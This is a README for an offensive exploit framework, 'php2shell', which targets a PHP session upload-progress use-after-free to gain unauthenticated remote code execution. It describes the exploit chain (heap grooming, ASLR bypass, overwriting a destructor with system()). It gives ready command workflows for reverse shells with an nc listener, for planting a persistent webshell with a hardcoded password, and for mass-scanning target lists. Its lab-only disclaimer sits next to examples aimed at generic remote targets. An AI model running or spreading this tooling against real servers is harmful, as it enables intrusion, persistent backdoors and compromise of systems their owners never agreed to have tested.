<div align="center">

# 💀 ZeroHack `php2shell` Lab & PoC Framework

**CVE-2026-109618 / CVE-2026-109619**

[![CVSS](https://img.shields.io/badge/CVSS-9.2%20Critical-red?style=for-the-badge&logo=shield)](https://nvd.nist.gov/)
[![PHP](https://img.shields.io/badge/PHP-5.4%20%E2%86%92%208.5.11-blue?style=for-the-badge&logo=php)](https://php.net/)
[![Patched](https://img.shields.io/badge/Patched-8.2.35%20%7C%208.3.36%20%7C%208.4.27%20%7C%208.5.12-green?style=for-the-badge)](https://www.php.net/)
[![License](https://img.shields.io/badge/License-MIT-purple?style=for-the-badge)](LICENSE)

*"One URL in, a shell out."*

</div>

---

> **⚠️ AUTHORIZED LAB USE ONLY.**
> This framework is designed exclusively for local Docker labs and systems you own. The `--exploit`, `--shell`, and `--persist` modes send live attack traffic. **Never** point this at infrastructure you do not own or have explicit written permission to test. The authors assume no liability for misuse or damage caused by this program.

---

## 📖 Table of Contents
1. [Overview](#-overview)
2. [The Vulnerability](#-the-vulnerability)
3. [Exploitation Flow](#-exploitation-flow)
4. [Folder Structure](#-folder-structure)
5. [Kali Linux Setup Guide](#-kali-linux-setup-guide)
6. [Docker Lab Setup](#-docker-lab-setup)
7. [Usage & Command Reference](#-usage--command-reference)
8. [Persisting & RCE](#-persisting--rce)
9. [Troubleshooting](#-troubleshooting)
10. [References](#-references)

---

## 🔍 Overview

This repository provides a self-contained, highly deterministic lab environment and exploitation framework for the **PHP2Shell** chain. It merges the most reliable public research techniques into a single, easy-to-use toolkit.

* **Target:** PHP Core Engine (`ext/session/session.c`)
* **Impact:** Unauthenticated Remote Code Execution (RCE)
* **Root Cause:** `session.upload_progress` Use-After-Free (UAF) and handler confusion.
* **Affected Versions:** PHP 5.4.0 to 8.5.11 (8.1 and older are EOL and *never patched*).
* **Fixed Versions:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12.

---

## 🧠 The Vulnerability

The vulnerability chain relies on a flaw in how PHP handles multipart form data uploads and session state.

1. **The Trigger:** PHP's `session.upload_progress` feature caches raw `zval*` pointers into the session HashTable.
2. **The Stall:** If an attacker sends a multipart payload and stalls between chunks, the HashTable is freed (due to memory limits or session cleanup).
3. **The UAF:** When the second chunk arrives, PHP attempts to write to the stale pointer, resulting in a **Write-What-Where** primitive.
4. **The Weaponization:** By overwriting the `pDestructor` of a forged HashTable with `zif_system`, the attacker can redirect execution to `system()`.

---

## 🚀 Exploitation Flow

```text
[ Attacker ] 
    │
    ├── (1) Fingerprint PHP Version ───────────► [ Target: PHP 8.4.26 ]
    │
    ├── (2) Heap Grooming (N requests) ────────► [ Stabilize Memory Layout ]
    │
    ├── (3) ASLR Bypass (Leak Pointers) ───────► [ Set-Cookie: 0x7f... ]
    │
    ├── (4) Trigger UAF (Chunk 1 -> Stall) ────► [ HashTable Freed ]
    │
    ├── (5) Trigger UAF (Chunk 2) ─────────────► [ Write-What-Where ]
    │
    └── (6) Reverse Shell / Webshell ──────────► [ RCE Achieved ]

📁 Folder Structure
php2shell-poc/
├── README.md               # This file
├── requirements.txt        # Python dependencies (requests, urllib3)
├── php2shell.py            # Main exploitation & check framework
├── extract_offsets.py      # Helper tool to extract build-specific offsets
│
├── docker/                 # Deterministic Lab Environment
│   ├── Dockerfile          # Builds the vulnerable PHP 8.4.26 image
│   ├── docker-compose.yml  # Spins up the lab on 127.0.0.1:8088
│   ├── apache.conf         # Forces single-worker mode (CRITICAL)
│   └── php.ini             # Enables upload_progress & forces OOM
│
├── payloads/               # Post-Exploitation Payloads
│   ├── reverse_shell.php   # Standard bash reverse shell
│   └── webshell.php        # Obfuscated persistence webshell
│
└── tools/                  # Standalone Utilities
    └── check_target.py     # Fast, multithreaded mass vulnerability scanner

🛠 Kali Linux Setup Guide

To run this framework, you need a Linux environment (Kali Linux recommended) with Python 3 and Docker.
1. Install System Requirements
bash

sudo apt update
sudo apt install -y python3 python3-pip python3-venv git docker.io docker-compose binutils

2. Clone the Repository
bash

git clone https://github.com/ZeroHackOrg/php2shell-poc.git
cd php2shell-poc

3. Set Up Python Virtual Environment
bash

python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

4. Verify Installation
bash

python3 php2shell.py --help

🐳 Docker Lab Setup

The included Docker environment uses php:8.4.26-apache and forces a single worker process. This is critical. If Apache has multiple workers, your exploit requests might land on a clean process, and the exploit will fail.
1. Build and Start the Lab
bash

cd docker
docker compose up -d --build
cd ..

The target is now listening on http://127.0.0.1:8088.
2. Verify the Target is Alive
bash

curl http://127.0.0.1:8088/index.php
# Expected output: ZeroHack php2shell Lab - Target Active

3. Run the Check Mode
bash

python3 php2shell.py http://127.0.0.1:8088/index.php --check

Expected: [!] Target is VULNERABLE (PHP 8.4.26)
💻 Usage & Command Reference

The main framework is controlled via php2shell.py.
Command Flags
Flag	Description
target	Required. The target URL (e.g., http://127.0.0.1:8088/index.php).
--check	Safely fingerprints the PHP version to determine vulnerability.
--exploit	Sends the crafted multipart request to trigger the UAF.
--aslr-bypass	Attempts to leak heap/libphp pointers via Set-Cookie headers.
--heap-groom N	Sends N concurrent requests to stabilize the heap layout.
--shell	Attempts to spawn a reverse shell using payloads/reverse_shell.php.
--lhost	Attacker Listener IP (default: 127.0.0.1).
--lport	Attacker Listener Port (default: 4444).
--persist	Deploys payloads/webshell.php for persistence.
--offsets FILE	Loads build-specific offsets from a JSON file.
Example Workflows

1. Basic Vulnerability Check
bash

python3 php2shell.py http://target.com/index.php --check

2. Mass Scanning with tools/check_target.py
bash

# Scan a single target
python3 tools/check_target.py -u http://target.com

# Scan a list of targets with 20 threads
python3 tools/check_target.py -f targets.txt -t 20

3. Full Exploitation Chain (Reverse Shell)
Terminal 1 (Listener):
bash

nc -lvnp 4444

Terminal 2 (Exploit):
bash

python3 php2shell.py http://127.0.0.1:8088/index.php \
    --exploit \
    --aslr-bypass \
    --heap-groom 50 \
    --shell \
    --lhost 127.0.0.1 --lport 4444

🔬 Persisting & RCE

If the reverse shell fails (often due to firewalls or missing binaries), you can attempt to drop a webshell.
bash

python3 php2shell.py http://127.0.0.1:8088/index.php \
    --exploit \
    --persist

This will attempt to write payloads/webshell.php to the target's webroot (usually /var/www/html/pwn.php).

Access the shell via:
text

http://target.com/pwn.php?auth_pass=ZeroHackPersist2026&cmd=id

🛠 Extracting Build-Specific Offsets

Full RCE reliability depends on the exact memory offsets of the target's libphp.so. If the default offsets fail, extract them from the target binary.

    Pull the binary from the target (e.g., /usr/lib/apache2/modules/libphp.so).

    Run the extractor:

bash

python3 extract_offsets.py /path/to/libphp.so

    Save the output to offsets.json and pass it to the exploit:

bash

python3 php2shell.py http://target.com/index.php --exploit --offsets offsets.json

⚠️ Troubleshooting
Issue	Solution
no configuration file provided	You are running docker compose in the wrong directory. Run cd docker first.
Target appears PATCHED	Your Docker image may have auto-updated. Ensure you are building from the exact php:8.4.26-apache tag.
Trigger failed / 500 Error	The target crashed (OOM), but the worker died before the second chunk could be sent. Increase memory_limit in docker/php.ini.
No leak obtained	ASLR is active. Try running --heap-groom 100 before --aslr-bypass to stabilize the heap.
Connection refused (Reverse Shell)	Ensure your --lhost is reachable from the Docker container. Use host.docker.internal instead of 127.0.0.1 if on Mac/Windows.
📚 References & Credits

This framework was built by synthesizing research from the following public disclosures. We stand on the shoulders of giants.

    Whackermelon — Php2Shell-POC: One URL in, a reverse shell out

    xuehuolll — Remote ASLR chain & per-build symbol extraction

    9bie — ASLR bypass via prefork shared address space

    0x4148 — Docker lab for the UAF primitive

    VulnCheck — Early analysis on ASLR bypass limitations

    ZeroHack Security — Framework integration, Docker lab, and UI


